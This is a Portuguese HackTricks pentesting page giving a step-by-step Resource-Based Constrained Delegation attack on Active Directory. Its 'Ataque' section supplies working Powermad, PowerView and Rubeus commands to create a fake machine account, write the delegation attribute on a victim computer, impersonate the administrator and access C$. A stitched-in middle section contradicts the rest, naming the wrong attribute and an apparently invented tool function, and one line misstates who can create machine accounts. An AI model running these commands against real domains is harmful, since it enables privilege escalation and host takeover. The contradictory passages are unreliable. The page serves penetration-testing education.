# Delegação Restrita Baseada em Recursos

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Conceitos básicos de Delegação Restrita Baseada em Recursos

Isso é semelhante à [Delegação Restrita](constrained-delegation.md) básica, mas **em vez de conceder permissões a um objeto para se **fazer passar por qualquer usuário em relação a um serviço**. A Delegação Restrita Baseada em Recursos **define no objeto quem pode se fazer passar por qualquer usuário em relação a ele**.

Nesse caso, o objeto restrito terá um atributo chamado _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ com o nome do usuário que pode se fazer passar por qualquer outro usuário em relação a ele.

Outra diferença importante desta Delegação Restrita em relação às outras delegações é que qualquer usuário com **permissões de gravação em uma conta de máquina** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) pode definir o _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ (nas outras formas de Delegação, você precisava de privilégios de administrador de domínio).

### Novos conceitos

Na Delegação Restrita, foi dito que a flag **`TrustedToAuthForDelegation`** dentro do valor _userAccountControl_ do usuário é necessária para realizar um **S4U2Self**. Mas isso não é completamente verdade.

A realidade é que mesmo sem esse valor, você pode realizar um **S4U2Self** contra qualquer usuário se você é um **serviço** (tem um SPN), mas se você **tiver `TrustedToAuthForDelegation`**, o TGS retornado será **Forwardable** e se você **não tiver** essa flag, o TGS retornado **não** será **Forwardable**.

No entanto, se o **TGS** usado em **S4U2Proxy** não for **Forwardable**, tentar abusar de uma **Delegação Restrita básica** não funcionará. Mas se você estiver tentando explorar uma **Delegação Restrita Baseada em Recursos**, funcionará (isso não é uma vulnerabilidade, é um recurso, aparentemente).

### Estrutura do ataque

> Se você tiver **privilégios equivalentes de gravação** sobre uma conta de **Computador**, você pode obter **acesso privilegiado** nessa máquina.

Suponha que o atacante já tenha **privilégios equivalentes de gravação sobre o computador da vítima**.

1. O atacante **compromete** uma conta que tem um **SPN** ou **cria uma** ("Serviço A"). Note que **qualquer** _Usuário Administrador_ sem nenhum outro privilégio especial pode **criar** até 10 **objetos de computador (**_**MachineAccountQuota**_**)** e definir um SPN para eles. Então, o atacante pode simplesmente criar um objeto de computador e definir um SPN.
2. O atacante **abusa de seu privilégio de gravação** sobre o computador da vítima (Serviço B) para configurar **delegação restrita baseada em recursos para permitir que o Serviço A se faça passar por qualquer usuário** em relação a esse computador da vítima (Serviço B).
3. O atacante usa o Rubeus para realizar um **ataque S4U completo** (S4U2Self e S4U2Proxy) do Serviço A para o Serviço B para um usuário **com acesso privilegiado ao Serviço B**.
   1. S4U2Self (da conta comprometida/criada com o SPN): Solicita um **TGS do Administrador para mim** (Não Forwardable).
   2. S4U2Proxy: Usa o **TGS não Forwardable** do passo anterior para solicitar um **TGS** do **Administrador** para o **host da vítima**.
   3. Mesmo se você estiver usando um TGS não Forwardable, como está explorando a Delegação Restrita Baseada em Recursos, funcionará.
4. O atacante pode **passar o ticket** e **se fazer passar pelo usuário** para obter **acesso ao Serviço B da vítima**.

Para verificar a _**MachineAccountQuota**_ do domínio, você pode usar:
```
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Ataque

### Criando um Objeto de Computador

Você pode criar um objeto de computador dentro do domínio usando o [powermad](https://github.com/Kevin-Robertson/Powermad)**:**
```csharp
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
# Delegação Restrita Baseada em Recursos

A Delegação Restrita Baseada em Recursos (RBCD) é uma técnica que permite que um usuário execute ações em nome de outro usuário em um recurso específico. Isso é útil em cenários em que um usuário precisa executar uma tarefa em um recurso que ele não tem permissão direta, mas outro usuário tem.

Por exemplo, imagine que um usuário chamado `User1` precisa executar uma tarefa em um servidor chamado `Server1`, mas ele não tem permissão direta no servidor. No entanto, outro usuário chamado `User2` tem permissão no servidor. Com a RBCD, podemos delegar permissões de `User2` para `User1` em relação ao servidor `Server1`.

A RBCD é implementada usando o atributo `msDS-AllowedToDelegateTo` no objeto de computador no Active Directory. Esse atributo especifica quais usuários podem ser delegados para o computador e em quais serviços eles podem executar ações.

Para explorar a RBCD, precisamos encontrar um objeto de computador que tenha o atributo `msDS-AllowedToDelegateTo` definido. Podemos fazer isso usando a ferramenta BloodHound ou consultando o Active Directory diretamente.

Depois de encontrar um objeto de computador com a RBCD configurada, podemos explorar as permissões delegadas para encontrar um serviço que possamos comprometer. Podemos fazer isso usando a ferramenta `Get-NetComputerDelegatedAccess` do PowerView.

Uma vez que encontramos um serviço que podemos comprometer, podemos usar a técnica de `Pass-the-Ticket` para obter acesso ao serviço em nome do usuário delegado. Isso nos permite executar ações no serviço como se fôssemos o usuário delegado.

A RBCD é uma técnica poderosa que pode ser usada para comprometer serviços em um ambiente do Active Directory. É importante que os administradores do Active Directory monitorem cuidadosamente os objetos de computador com o atributo `msDS-AllowedToDelegateTo` definido e restrinjam o uso da RBCD sempre que possível.
```bash
Get-DomainComputer SERVICEA #Check if created if you have powerview
```
### Configurando a Delegação Restrita Baseada em Recursos

**Usando o módulo PowerShell do Active Directory**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Usando o powerview**
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Realizando um ataque S4U completo

Primeiramente, criamos o novo objeto de Computador com a senha `123456`, então precisamos do hash dessa senha:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Isso imprimirá os hashes RC4 e AES para essa conta.\
Agora, o ataque pode ser realizado:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Você pode gerar mais tickets apenas fazendo uma solicitação usando o parâmetro `/altservice` do Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
{% hint style="danger" %}
Observe que os usuários têm um atributo chamado "**Não pode ser delegado**". Se um usuário tiver esse atributo como Verdadeiro, você não poderá se passar por ele. Essa propriedade pode ser vista dentro do Bloodhound.
{% endhint %}

![](../../.gitbook/assets/B3.png)

### Acessando

O último comando executará o **ataque completo S4U e injetará o TGS** do Administrador para o host da vítima na **memória**.\
Neste exemplo, foi solicitado um TGS para o serviço **CIFS** do Administrador, então você poderá acessar **C$**:
```bash
ls \\victim.domain.local\C$
```
### Abusar de diferentes tickets de serviço

Saiba mais sobre os [**tickets de serviço disponíveis aqui**](silver-ticket.md#available-services).

## Erros do Kerberos

* **`KDC_ERR_ETYPE_NOTSUPP`**: Isso significa que o Kerberos está configurado para não usar DES ou RC4 e você está fornecendo apenas o hash RC4. Forneça ao Rubeus pelo menos o hash AES256 (ou apenas forneça os hashes rc4, aes128 e aes256). Exemplo: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
* **`KRB_AP_ERR_SKEW`**: Isso significa que o horário do computador atual é diferente do do DC e o Kerberos não está funcionando corretamente.
* **`preauth_failed`**: Isso significa que o nome de usuário + hashes fornecidos não estão funcionando para fazer login. Você pode ter esquecido de colocar o "$" dentro do nome de usuário ao gerar os hashes (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
* **`KDC_ERR_BADOPTION`**: Isso pode significar:
  * O usuário que você está tentando impersonar não pode acessar o serviço desejado (porque você não pode impersoná-lo ou porque ele não tem privilégios suficientes)
  * O serviço solicitado não existe (se você solicitar um ticket para winrm, mas o winrm não estiver em execução)
  * O computador falso criado perdeu seus privilégios sobre o servidor vulnerável e você precisa devolvê-los.

## Referências

* [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
* [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
* [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
